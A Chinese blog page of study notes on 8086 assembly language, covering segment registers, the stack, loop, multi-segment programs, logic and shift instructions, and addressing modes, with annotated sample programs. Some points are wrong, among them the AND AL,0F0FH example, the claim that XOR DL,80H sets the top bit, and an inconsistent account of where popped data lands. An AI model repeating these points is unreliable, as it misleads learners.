<h2 id="3-2-DS和-address"><a href="#3-2-DS和-address" class="headerlink" title="3.2.DS和[address]"></a>3.2.DS和[address]</h2><p><strong>CPU 要读写一个内存单元的时候，必须给出这个内存单元的地址。内存单元的地址由段地址和偏移地址组成。DS寄存器通常需要存放访问数据的段地址</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mov bx,1000H</span><br><span class="line">mov ds,bx</span><br><span class="line">mov al,[0]</span><br><span class="line"></span><br><span class="line">[0]:表示内存单元的偏移地址</span><br><span class="line">指令执行的时候，CPU自动取DS中的数据作为内存单元的段地址</span><br><span class="line">mov al,[0]：表示数据从1000:0 单元到al 的传送</span><br></pre></td></tr></table></figure>

<h2 id="3-3-字的传送"><a href="#3-3-字的传送" class="headerlink" title="3.3.字的传送"></a>3.3.字的传送</h2><p>CPU是16位结构，有16根数据线，可以一次性传送16位数据，就是一个字</p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/1603855203907.png" alt="1603855203907"></p>
<h2 id="3-4-数据段"><a href="#3-4-数据段" class="headerlink" title="3.4.数据段"></a>3.4.数据段</h2><p><img src="https://gitee.com/kingwempity/images/raw/master/images/1603855360712.png" alt="1603855360712"></p>
<p><strong>总结</strong></p>
<blockquote>
<ol>
<li>字在内存中存储，使用两个地址连续的内存单元存放，低位字节存放在低地址单元，高位字节存放在高地址单元</li>
<li>双字在内存中存储，使用四个地址连续的内存单元存放，即两个字型数据的存储单元</li>
<li>使用mov指令访问内存单元，可以在mov指令中只给出单元的偏移地址，此时段地址默认在DS寄存器中</li>
<li>[address]表示一个偏移地址位address的内存单元，例如[2]表示偏移地址为2的内存单元</li>
<li>在内存和寄存器之间传动数据的时候，高地址单元和高8位寄存器相对应，低地址单元和低8位寄存器相对应</li>
</ol>
</blockquote>
<h2 id="3-5-栈"><a href="#3-5-栈" class="headerlink" title="3.5.栈"></a>3.5.栈</h2><ol>
<li>入栈：就是将一个新的元素放到栈顶，栈顶指针减小；</li>
<li>出栈：就是从栈顶取出一个新的元素，栈顶指针增大；</li>
<li>栈顶的元素总是LIFO(Last In First Out)：“先进后出”；</li>
</ol>
<h2 id="3-6-CPU提供栈机制"><a href="#3-6-CPU提供栈机制" class="headerlink" title="3.6.CPU提供栈机制"></a>3.6.CPU提供栈机制</h2><p>基本命令就是PUSH和POP，push ax 表示将寄存器ax中的数据送入栈中，pop ax 表示从栈顶中取出数据送入到ax，CPU入栈和出栈操作都是以字为单位进行的。</p>
<p><strong>段寄存器SS和SP，栈顶的段地址存放在SS中，偏移地址存放在SP中，任意时刻SS:SP指向栈顶元素</strong></p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/1603856276469.png" alt="1603856276469"></p>
<h2 id="3-7-栈顶超解问题"><a href="#3-7-栈顶超解问题" class="headerlink" title="3.7.栈顶超解问题"></a>3.7.栈顶超解问题</h2><p>CPU不会保证我们对栈的操作不会超界。CPU只知道栈顶(SS:SP)在何处,不知道安排的栈的空间由多大。所以编程的时候操心栈顶超界的问题。</p>
<h2 id="3-8-栈的总结"><a href="#3-8-栈的总结" class="headerlink" title="3.8.栈的总结"></a>3.8.栈的总结</h2><blockquote>
<ol>
<li>在ss,sp中存放栈顶的段地址和偏移地址：提供入栈和出栈的指令，他们根据SS:SP指示的地址，按照栈的方式访问内存单元</li>
<li>push指令的执行步骤：①sp&#x3D;sp-2 ②向ss:sp指向的字单元中送入数据</li>
<li>pop指令的执行步骤：①从ss：sp指向的字单元中读取数据②sp&#x3D;sp+2</li>
<li>任意时刻，ss：sp指向栈顶元素</li>
<li>CPU只记录栈顶，栈空间的大小由我们自己管理</li>
<li>用栈来暂存以后需要恢复的寄存器的内容时，寄存器出栈的顺序要和入栈的相反</li>
<li>push，pop实质是一种内存传送指令，注意他们灵活使用</li>
</ol>
<p><strong>总结：栈是一种非常重要的机制，一定要深入理解，灵活掌握</strong></p>
</blockquote>
<h2 id="3-9-段的综述"><a href="#3-9-段的综述" class="headerlink" title="3.9.段的综述"></a>3.9.段的综述</h2><blockquote>
<p>我们可以将一段内存定义为一个段，用一个段地址指示段，用偏移地址访问段内的单元</p>
<p>我们用一个段存放数据，可以定义为 <strong>数据段</strong></p>
<p>我们用一个段存放代码，可以定义为 <strong>代码段</strong></p>
<p>我们用一个段当作栈，可以定义为 <strong>栈段</strong></p>
<p><strong>数据段</strong>：将段地址存放在DS中</p>
<p><strong>代码段</strong>：将它们的段地址存放在CS中，将段中的第一条指令的偏移地址存放在IP中，这样CPU就将执行我们定义的代码段中的指令</p>
<p><strong>栈段</strong>：段地址存放在SS中，将栈顶单元的偏移地址存放在SP中</p>
</blockquote>
<h1 id="4-第一个程序"><a href="#4-第一个程序" class="headerlink" title="4.第一个程序"></a>4.第一个程序</h1><h2 id="4-1-一个源程序从写出到执行的过程"><a href="#4-1-一个源程序从写出到执行的过程" class="headerlink" title="4.1.一个源程序从写出到执行的过程"></a>4.1.一个源程序从写出到执行的过程</h2><ul>
<li>第一步：编写汇编程序</li>
<li>第二步：对源程序进行编译连接</li>
<li>第三步：执行可执行文件中的程序</li>
</ul>
<h2 id="4-2-源程序"><a href="#4-2-源程序" class="headerlink" title="4.2.源程序"></a>4.2.源程序</h2><blockquote>
<p>汇编语言中包含两种指令：<strong>汇编指令</strong>和 <strong>伪指令</strong></p>
<ul>
<li>汇编指令：有对应机器码的指令，最终被CPU执行</li>
<li>伪指令：由编译器进行执行，进行相关的编译动作</li>
</ul>
</blockquote>
<p><strong>伪指令：</strong></p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/1604027358862.png" alt="1604027358862"></p>
<p><strong>源程序中的程序</strong></p>
<p>将源程序文件中所有内容称之为源程序，然后通过编译连接后转变为机器码，存储在可执行文件中</p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/1604027748325.png" alt="1604027748325"></p>
<p><strong>标号</strong></p>
<p>一个标号指代了一个地址，作为一个段的名称，这个段的名称最终会编译一个段的段地址。</p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/1604028015173.png" alt="1604028015173"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ax,4c00H</span><br><span class="line">int 21H			;执行4c号功能，程序返回功能</span><br></pre></td></tr></table></figure>

<h1 id="5-BX-和loop指令"><a href="#5-BX-和loop指令" class="headerlink" title="5.[BX]和loop指令"></a>5.[BX]和loop指令</h1><h2 id="5-1-bx"><a href="#5-1-bx" class="headerlink" title="5.1.[bx]"></a>5.1.[bx]</h2><blockquote>
<p>mov ax,[bx]</p>
<p>说明：bx中存放的数据作为一个偏移地址EA，段地址SA默认在DS中，将SA:EA处的数据送到ax中</p>
<p>mov [bx],ax</p>
<p>说明：bx中存放的数据作为要给偏移地址EA，段地址默认在DS中，将ax中的数据送入到内存中</p>
</blockquote>
<h2 id="5-2-Loop指令"><a href="#5-2-Loop指令" class="headerlink" title="5.2.Loop指令"></a>5.2.Loop指令</h2><p>就是循环指令,它会减少CX的值并检查是否为0，如果不为0则跳转回标签继续循环。</p>
<h2 id="5-3-Loop指令和-bx-使用"><a href="#5-3-Loop指令和-bx-使用" class="headerlink" title="5.3.Loop指令和[bx]使用"></a>5.3.Loop指令和[bx]使用</h2><p><img src="https://gitee.com/kingwempity/images/raw/master/images/1604544565226.png" alt="1604544565226"></p>
<blockquote>
<p>这段汇编语言代码主要实现了一个简单的功能，即计算从内存中某个地址开始的12个字节数据之和，并最终通过DOS中断调用返回到操作系统。</p>
<p>下面是详细的分析和解释：</p>
<ol>
<li><p><strong>段定义</strong>:</p>
<ul>
<li><strong><code>assume cs:code</code></strong> 命令告诉汇编器代码将位于名为**<code>code</code>**的代码段中。</li>
<li><strong><code>code segment</code></strong> 和 <strong><code>code ends</code></strong> 之间的内容定义了实际的代码段。</li>
</ul>
</li>
<li><p><strong>初始化寄存器</strong>:</p>
<ul>
<li>**<code>mov ax,0fffH</code>**将十六进制数0fffH送入AX寄存器。通常，这是为了设置DS（数据段）寄存器以指向内存中的某个数据段，但此处的值似乎用于演示目的，实际上可能会导致访问内存错误，因为0fffH对于大多数程序来说不是一个有效的段地址。</li>
<li><strong><code>mov ds,ax</code></strong> 将AX的内容送入DS寄存器，设定数据段的基地址。</li>
<li><strong><code>mov bx,0</code></strong> 初始化BX为0，BX将作为偏移地址来访问内存中的数据。</li>
<li><strong><code>mov dx,0</code></strong> 初始化DX为0，DX将用来累加数据之和。</li>
<li><strong><code>mov cx,12</code></strong> <u>初始化CX为12，CX将作为循环计数器，控制循环执行12次。</u></li>
</ul>
</li>
<li><p><strong>循环求和</strong>:</p>
<ul>
<li><strong><code>s:</code></strong> 标签定义了一个循环开始的位置。</li>
<li><strong><code>mov al,[bx]</code></strong> 将BX寄存器指向的内存单元中的字节数据加载到AL寄存器中。</li>
<li><strong><code>mov ah,0</code></strong> 清零AH寄存器，确保AL中的字节数据在后续操作中被视为无符号数。</li>
<li><strong><code>add dx,ax</code></strong> 将AX寄存器的内容（此时为AL中的数据加上AH中的0）加到DX中，累计总和。</li>
<li><strong><code>inc bx</code></strong> 将BX的值增加1，以便下一次循环读取下一个字节。</li>
<li><strong><code>loop s</code></strong> 是一个循环指令，它会减少CX的值并检查是否为0，如果不为0则跳转回标签<code>s</code>继续循环。</li>
</ul>
</li>
<li><p><strong>退出程序</strong>:</p>
<ul>
<li><code>mov ax,4C00H</code> 将4C00H送入AX寄存器，这是DOS中断21H的功能号，用于请求程序终止并返回到操作系统，其中4CH表示退出程序，00H是返回给操作系统的错误码，通常表示正常退出。</li>
<li><code>int 21H</code> 执行DOS中断调用，结束程序。</li>
</ul>
</li>
</ol>
<p>注意：此代码中的DS段寄存器设置为0fffH，这在实际应用中很可能会导致访问冲突或错误，除非程序在特定的内存布局中运行，该布局中0fffH是合法且预期的数据段起始地址。在常规的实模式DOS程序中，数据段地址应由程序加载时正确设置，通常不会直接设置为这么高的地址。</p>
</blockquote>
<h2 id="5-4-段前缀"><a href="#5-4-段前缀" class="headerlink" title="5.4.段前缀"></a>5.4.段前缀</h2><ul>
<li><code>mov ax,ds:[bx]</code>:将一个内存单元的内容送入ax中，这个内存单元存放两个字节，偏移地址在<code>bx</code>中，段地址在<code>ds</code>中</li>
<li><code>mov  ax,cs:[bx]</code>,<code>mov ax,es:[bx]</code>,<code>mov ax,ss:[0]</code>,<code>mov ax,cs:[0]</code></li>
</ul>
<p>这些出现在访问内存单元的指令中，用于显示的指明内存单元的段地址的<code>ds</code>:,<code>cs:</code>,<code>ss:</code>,<code>es:</code>,我们称之为段前缀</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">段寄存器:CS、DS、ES、SS</span><br><span class="line">代码段：CS 比如：IP执行地址都是CS代码段的内容</span><br><span class="line">数据段：DS 比如：如mov ax,[bx]间接寻址法所指的都是数据段的数据</span><br><span class="line">堆栈段：SS 比如：SP堆栈数据、BP基指针，都是指堆栈段的</span><br><span class="line">附加段：ES 比如：mov ax,es:[di] 利用间接寻址法取ES段的数据</span><br></pre></td></tr></table></figure>

<h2 id="5-5-一段安全的段空间"><a href="#5-5-一段安全的段空间" class="headerlink" title="5.5.一段安全的段空间"></a>5.5.一段安全的段空间</h2><p><code>0:200~0:2ff</code>的256字节空间，这个段空间是安全的</p>
<h1 id="6-包含多个段的程序"><a href="#6-包含多个段的程序" class="headerlink" title="6.包含多个段的程序"></a>6.包含多个段的程序</h1><h2 id="6-1-在代码段中使用数据"><a href="#6-1-在代码段中使用数据" class="headerlink" title="6.1.在代码段中使用数据"></a>6.1.在代码段中使用数据</h2><p><img src="https://gitee.com/kingwempity/images/raw/master/images/1604557474529.png" alt="1604557474529"></p>
<p>**dw含义:**全称<code>define word</code>,在这里定义了8个字型数据，它们所占的内存空间大小为16字节</p>
<blockquote>
<p>程序中的指令需要对这8个数据进行累加，8个数据放在哪里呢？</p>
<p>答：程序在运行的时候CS中存放代码段的的段地址。dw定义的数据处于代码段的最开始，所以偏移地址为0，这8个数据在代码段的偏移0，2，4，6，8，A，C，E处。</p>
</blockquote>
<p><strong>ends start</strong>:指明程序的入口，被转化为一个入口地址</p>
<blockquote>
<p>这段汇编语言代码的功能是累加一组双字节（word）数据，并存储结果在寄存器AX中。下面是详细的代码分析：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">assume cs:code</span><br></pre></td></tr></table></figure>
<p>这一行声明段寄存器CS指向名为<code>code</code>的段。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">code segment</span><br><span class="line">dw  0123h, 0456h, 0789h, 0abch, 0defh, 0fedh, 0cbah, 0987h</span><br></pre></td></tr></table></figure>
<p>定义了一个名为<code>code</code>的段，在这个段中存放了8个双字节（word）的数据：0123h, 0456h, … , 0987h。这些数据以双字节为单位连续存储在内存中，每两个数据之间默认间隔一个字节地址（因为每个数据占2字节）。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">start:  mov bx,0</span><br><span class="line">mov ax,0</span><br><span class="line">mov cx,8</span><br></pre></td></tr></table></figure>
<ul>
<li><code>start:</code> 标记了程序的起始执行点。</li>
<li><code>mov bx,0</code> 初始化基址寄存器BX为0，BX将用来作为数据数组的指针。</li>
<li><code>mov ax,0</code> 将累加和的寄存器AX清零，用于存放最终的累加结果。</li>
<li><code>mov cx,8</code> 初始化计数寄存器CX为8，表示循环将执行8次，对应于数据数组中的8个元素。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s:   </span><br><span class="line">add ax,[bx]</span><br><span class="line">add bx,2</span><br><span class="line">loop s</span><br></pre></td></tr></table></figure>
<p>这是一个循环结构，用以累加数据段中的所有数据：</p>
<ul>
<li><code>s:</code> 是循环的标签。</li>
<li><code>add ax,[bx]</code> 将BX指向的内存单元中的数据（当前元素）加到AX中，实现累加操作。</li>
<li><code>add bx,2</code> 每次循环后，BX增加2，这是因为每个数据项是双字节（word），即2个字节，所以要跳过当前数据到下一个数据。</li>
<li><code>loop s</code> 是循环控制指令，它会自动将CX的值减1，如果CX不为0，则跳转回标签<code>s</code>继续执行循环，直到CX减到0为止，此时循环结束。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br></pre></td></tr></table></figure>

<p>最后，使用DOS中断21h的服务号4Ch来结束程序，返回操作系统，其中AX寄存器的低字节00h表示程序正常退出。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>
<ul>
<li><code>code ends</code> 表示<code>code</code>段定义结束。</li>
<li><code>end start</code> 指定程序的入口点为<code>start</code>，同时告知汇编器程序汇编结束。</li>
</ul>
<p>综上所述，这段代码的作用是从内存中预先设定的一组双字节数据（0123h至0987h）开始，将这些数据累加起来，并将累加的结果存储在AX寄存器中。</p>
</blockquote>
<h2 id="6-2-在代码段中使用栈"><a href="#6-2-在代码段中使用栈" class="headerlink" title="6.2.在代码段中使用栈"></a>6.2.在代码段中使用栈</h2><p><img src="https://gitee.com/kingwempity/images/raw/master/images/1604563764138.png" alt="1604563764138"></p>
<p><strong>对于sp的理解:</strong></p>
<p>第一步：看计算机系统内存：</p>
<p>SA:10: 23 12 56 04 ……….09              16个字节</p>
<p>SA:20:0…………………………..0              对应 第二个dw:00000000</p>
<p>SA:30:0…………………………..0               对应 第二个dw:00000000</p>
<blockquote>
<p>这段汇编代码完成了一个特定的任务，即通过堆栈在代码段中移动一个16字节数据块。具体分析如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">assume code</span><br><span class="line">code segment</span><br><span class="line">dw 0123h,0456h,0789h, 0abch, 0defh, 0fedh, 0cbah, 0987h</span><br><span class="line">dw 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0</span><br></pre></td></tr></table></figure>
<p>首先，定义了两组双字节（word）数据。前8个是非零数据，后16个初始化为0。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">start: mov ax,cs</span><br><span class="line">       mov  ss,ax</span><br><span class="line">       mov  sp,30h</span><br></pre></td></tr></table></figure>
<p>这部分代码设置了堆栈段（SS）与代码段（CS）相同，并将堆栈指针（SP）设置为30h，意味着堆栈从地址CS:30h开始向下增长，预留了一定的空间用于存储数据。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">       mov bx,0</span><br><span class="line">       mov cx,8</span><br><span class="line">s:     push cs:[bx]</span><br><span class="line">       add bx,2</span><br><span class="line">       loop s</span><br></pre></td></tr></table></figure>
<p>这里开始一个循环，将前8个非零数据通过<code>push</code>指令压入堆栈。<code>cs:[bx]</code>访问的是代码段中的数据，从偏移量BX开始的双字节。每次循环，BX增加2，指向下一个数据，总共循环8次，将所有非零数据压栈。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">       mov bx,0</span><br><span class="line">       mov cx,8</span><br><span class="line">s0:    pop cs:[bx]</span><br><span class="line">       add bx,2</span><br><span class="line">       loop s0</span><br></pre></td></tr></table></figure>
<p>接着，进行第二个循环<code>s0</code>，这次是从堆栈中弹出数据并存回到代码段中原来初始化为0的部分。同样循环8次，每次<code>pop</code>后，BX增加2，确保数据被正确地放置到代码段的对应位置。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br></pre></td></tr></table></figure>
<p>最后，使用DOS中断21h的服务号4Ch来结束程序，返回操作系统，其中AX寄存器的低字节00h表示程序正常退出。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<p>标记代码段结束，并告知汇编器程序的结尾。</p>
<p>总结来说，这段代码通过堆栈实现了代码段内部的数据搬移，具体是从一段非零数据移到另一段初始为0的数据区域，展示了汇编语言中堆栈操作和循环控制的应用。</p>
</blockquote>
<h2 id="6-3-将数据、代码、栈放入到不同的段"><a href="#6-3-将数据、代码、栈放入到不同的段" class="headerlink" title="6.3.将数据、代码、栈放入到不同的段"></a>6.3.将数据、代码、栈放入到不同的段</h2><p><img src="https://gitee.com/kingwempity/images/raw/master/images/1604564239260.png" alt="1604564239260"></p>
<p><strong>对于sp的理解</strong></p>
<p>c 等于开辟了一块空间，在这段空间中</p>
<p>SA:0:00000000</p>
<p>SA:10:000000000</p>
<p>然后就sp 就指向了20h</p>
<blockquote>
<p>这段汇编代码演示了如何在不同的段之间移动数据，具体是从数据段A到堆栈段C，然后又从堆栈段C返回到另一个位置在数据段A中。以下是详细分析：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">assume cs:b,ds:a,ss:c</span><br></pre></td></tr></table></figure>
<p>这一行指定了代码段寄存器CS指向段b，数据段寄存器DS指向段a，堆栈段寄存器SS指向段c。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a segment</span><br><span class="line">dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h</span><br><span class="line">a ends</span><br></pre></td></tr></table></figure>
<p>段a定义了8个双字节（word）的数据，这是原始数据集合。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c segment</span><br><span class="line">dw 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0</span><br><span class="line">c ends</span><br></pre></td></tr></table></figure>
<p>段c定义了16个双字节的空数据空间，准备用于临时存储从段a中移动过来的数据。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b segment</span><br><span class="line">d:     mov ax,c</span><br><span class="line">mov ss,ax</span><br><span class="line">mov sp,20h</span><br></pre></td></tr></table></figure>
<ul>
<li>这段代码位于代码段b中，从标号d开始执行。</li>
<li>首先，将段c的段地址加载到AX寄存器中，然后将AX的内容赋给SS，设置堆栈段指向段c。</li>
<li>接着，设置堆栈指针SP为20h，这意味着堆栈将从段c的地址20h处开始向下增长。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ax,a</span><br><span class="line">mov ds,ax</span><br><span class="line">mov bx,0</span><br><span class="line">mov cx,8</span><br><span class="line">s:      push [bx]</span><br><span class="line">add bx,2</span><br><span class="line">loop s</span><br></pre></td></tr></table></figure>
<ul>
<li>将段a的段地址加载到AX，再将AX赋给DS，使得数据段寄存器指向段a。</li>
<li>初始化BX为0，CX为8，用于后续循环操作。</li>
<li>进入循环s，将段a中由BX指向的数据通过<code>push</code>指令压入堆栈，之后BX加2指向下一个数据，使用<code>loop s</code>循环直到CX减到0。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov bx,0</span><br><span class="line">mov cx,8</span><br><span class="line">s0:    pop [bx]</span><br><span class="line">add bx,2</span><br><span class="line">loop s0</span><br></pre></td></tr></table></figure>
<ul>
<li>重置BX为0，CX为8，开始另一个循环s0。</li>
<li>在此循环中，从堆栈中弹出数据到段a中新的位置（之前清零的16个位置的前8个），BX每次加2指向下一个目标地址，直至循环结束。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br></pre></td></tr></table></figure>
<ul>
<li>最后，设置AX为4C00h，调用DOS中断21h来结束程序。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b ends</span><br><span class="line">end   d</span><br></pre></td></tr></table></figure>
<ul>
<li><strong><u>标记代码段b的结束，并告知汇编器程序的起始标签为d。</u></strong></li>
</ul>
<p>综上所述，这段代码首先设置好段寄存器以指向正确的段，然后通过堆栈机制，将段a中前8个双字节数据复制到段c中暂存，随后立即从段c中将这些数据弹出并覆盖段a中另一块预先清零的区域，完成了一次数据在段内的“转移”操作，并最终结束程序。</p>
</blockquote>
<h1 id="7-更灵活的定位内存地址的方法"><a href="#7-更灵活的定位内存地址的方法" class="headerlink" title="7.更灵活的定位内存地址的方法"></a>7.更灵活的定位内存地址的方法</h1><h2 id="7-1-and-和-or-指令、xor和not指令"><a href="#7-1-and-和-or-指令、xor和not指令" class="headerlink" title="7.1.and 和 or 指令、xor和not指令"></a>7.1.and 和 or 指令、xor和not指令</h2><blockquote>
<p><strong>and 指令：只有全为1，才为1</strong></p>
<p>mov al，01100011B</p>
<p>and  al,   00111011B</p>
<p><strong>or 指令：只用全为0，才为0</strong></p>
<p>or  al,   00111011B</p>
<p>xor cx,cx  			;CX清零，同时清除进位标志</p>
<p>AND  AX,AX		 ;自身相与值不变，该语句常用于清进位标志</p>
<p>AND AL,0FH		;分离出AL中低四位，高四位被清0</p>
<p>AND AL,0F0FH	;分离出AL中高四位，低四位被清0</p>
<p>XOR DL,80H		 ;DL中最高位置1</p>
<blockquote>
<p>总结</p>
<ul>
<li>NOT指令对标志位没有影响</li>
<li>执行除NOT指令外的逻辑指令后，OF和CF两个标志都被清0，而AF的状态不确定，其他标志反应操作结果的状态。</li>
<li>TEST指令对两个操作数进行“与”操作，但是不保留“与”的结果，只是通过标志状态的判断，得出测试结果。</li>
</ul>
</blockquote>
</blockquote>
<h2 id="7-2-位移和循环位移"><a href="#7-2-位移和循环位移" class="headerlink" title="7.2.位移和循环位移"></a>7.2.位移和循环位移</h2><blockquote>
<p><strong>非循环移位指令：</strong></p>
<p>SAL　　——　　算术左移　　——　　最高位移入标志状态位CF，最低位补0</p>
<p>SAR　　——　　算术右移　　——　　最低位移入CF，最高位不变，最高位原来是1，右移过后最高位就补1</p>
<p>比如说：将10000000算术右移7位，应该变成11111111，而逻辑右移7位，则不考虑符号位，变为00000001</p>
<p>SHL　　——　　逻辑左移　　——　　最高位移入标志状态位CF，最低位补0</p>
<p>SHR　　——　　逻辑右移　　——　　最低位移入CF，最高位补0</p>
<p><strong>循环移位指令：</strong></p>
<p>ROL　　——　　循环左移　　——　　不带进位位的循环左移，最高位移入CF和最低位</p>
<p>ROR　　——　　循环右移　　——　　不带进位位的循环右移，最低位移入CF和最高位</p>
<p>RCL　　——　　带进位的循环左移　　——　　带进位位的循环左移，最高位移入CF，原来的CF进入最低位</p>
<p>RCR　　——　　带进位的循环右移　　——　　带进位位的循环右移，最低位移入CF，原来的CF进入最高位</p>
<blockquote>
<p>说明：</p>
<ul>
<li>CF的值总是最后一次被移入的值</li>
<li>位移指令影响标志位CF,OF,SF,ZF。而循环位移指令仅影响CF和OF位。</li>
<li>对OF位的影响：在移动1位的情况下，如果位移后的操作数是最高位改变了，OF就置1，否则置0.若位移次数大于1，那么OF 不确定。</li>
</ul>
</blockquote>
<blockquote>
<p>1、算术左移、逻辑左移</p>
<p>算术左移和逻辑左移一样都是<strong>右边补0</strong></p>
<p>[例] 00101011<br> 算术左移一位:01010110<br> 逻辑左移一位:01010110</p>
<p>2、逻辑右移：将二进制数整体右移，左边补0</p>
<p>[例]10101101逻辑右移一位为01010110</p>
<p>3、算术右移：<strong>符号位</strong>要一起移动，并且在左边补上符号位</p>
<p>[例]11100算术右移一位为11110（符号位1跟着一起移动并且左边补了1）</p>
</blockquote>
</blockquote>
<h2 id="7-3-以字符的形式给出数据"><a href="#7-3-以字符的形式给出数据" class="headerlink" title="7.3.以字符的形式给出数据"></a>7.3.以字符的形式给出数据</h2><p><img src="https://gitee.com/kingwempity/images/raw/master/images/1604630532787.png" alt="1604630532787"></p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">assume cs:code,ds:data</span><br></pre></td></tr></table></figure>

<p>这一行定义了代码段（CS）和数据段（DS）的段寄存器分别指向名为<code>code</code>和<code>data</code>的段。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data segment</span><br><span class="line">     db &quot;unIX&quot;</span><br><span class="line">     db &quot;foRK&quot;</span><br><span class="line">   data ends</span><br></pre></td></tr></table></figure>

<ul>
<li><code>data segment</code> 定义了数据段的开始。</li>
<li><code>db &quot;unIX&quot;</code> 和 <code>db &quot;foRK&quot;</code> 分别定义了两个字符串常量，每个字符串包含四个字符，存储在数据段中。”unIX” 和 “foRK” 会按顺序占据内存中的位置。</li>
<li><code>data ends</code> 标志数据段的结束。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;end start</span><br></pre></td></tr></table></figure>

<p>这一行指示汇编器程序的结束，并且指定程序的起始地址为 <code>start</code> 标签所在的位置。</p>
<p>总结：这个程序主要做了两件事情：定义了包含两个字符串的数据段，并在代码段中执行了一些基本的寄存器操作，最后通过调用 DOS 中断21h的4C号功能来结束程序。字符串”unIX”和”foRK”虽然被定义，但在程序中并没有被使用，它们的存在更多是为了演示数据段的定义。</p>
</blockquote>
<h2 id="7-4-bx-idata"><a href="#7-4-bx-idata" class="headerlink" title="7.4. [bx+idata]"></a>7.4. [bx+idata]</h2><p>[bx+idata]表示一个内存单元，它的偏移地址为（bx）+（itda）</p>
<h2 id="7-5-SI和DI"><a href="#7-5-SI和DI" class="headerlink" title="7.5.SI和DI"></a>7.5.SI和DI</h2><p>si 和 di 是与bx 功能相近的寄存器，si 和di 不能够分成两个8为寄存器来使用，下面是3组指令实现了相同的功能</p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/1604630773520.png" alt="1604630773520"></p>
<h2 id="7-6-bx-si-和-bx-di"><a href="#7-6-bx-si-和-bx-di" class="headerlink" title="7.6.[bx + si] 和 [bx + di]"></a>7.6.[bx + si] 和 [bx + di]</h2><h2 id="7-7-bx-si-idata-和-bx-di-idata"><a href="#7-7-bx-si-idata-和-bx-di-idata" class="headerlink" title="7.7.[bx + si + idata] 和 [bx + di + idata]"></a>7.7.[bx + si + idata] 和 [bx + di + idata]</h2><h1 id="8-数据处理的两个基本问题"><a href="#8-数据处理的两个基本问题" class="headerlink" title="8.数据处理的两个基本问题"></a>8.数据处理的两个基本问题</h1><p>定义了两个描述符号：</p>
<ul>
<li>通用寄存器reg包含了：ax，bx，cx，dx，（ah，al，bh，bl，ch，cl，dh，dl），sp，bp，si，di</li>
<li>段寄存器sreg包含了：ds，ss，cs，es</li>
</ul>
<h2 id="8-1-bx，si，di-和bp-基址变址寻址"><a href="#8-1-bx，si，di-和bp-基址变址寻址" class="headerlink" title="8.1.bx，si，di 和bp[基址变址寻址]"></a>8.1.bx，si，di 和bp[基址变址寻址]</h2><blockquote>
<p>只有BX，SI，DI和BP这4 个寄存器可以用于[…]中进行内存单元寻址</p>
</blockquote>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/1604631336930.png" alt="1604631336930"></p>
<blockquote>
<p>在[…]中，这4个寄存器可以单个出现，或者只能以4中组合出现：bx 和 si，bx 和 di，bp 和si，bp和di，比如下面指令是正确的：</p>
</blockquote>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/1604631454682.png" alt="1604631454682"></p>
<blockquote>
<p><strong>只要在[…]中使用寄存器bp，而指令中没有显性的给出段地址，段地址就默认在SS中，</strong>比如下面的指令</p>
</blockquote>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/1604631552612.png" alt="1604631552612"></p>
<h2 id="8-2-汇编语言中数据位置的表达"><a href="#8-2-汇编语言中数据位置的表达" class="headerlink" title="8.2.汇编语言中数据位置的表达"></a>8.2.汇编语言中数据位置的表达</h2><blockquote>
<p>立即数：对于直接包含在机器指令中的数据（执行前在CPU的指令缓冲器中），在汇编语言中称之为立即数，在汇编指令中直接给出</p>
</blockquote>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/1604631868136.png" alt="1604631868136"></p>
<blockquote>
<p>寄存器：要处理的数据在寄存器中</p>
</blockquote>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/1604631917384.png" alt="1604631917384"></p>
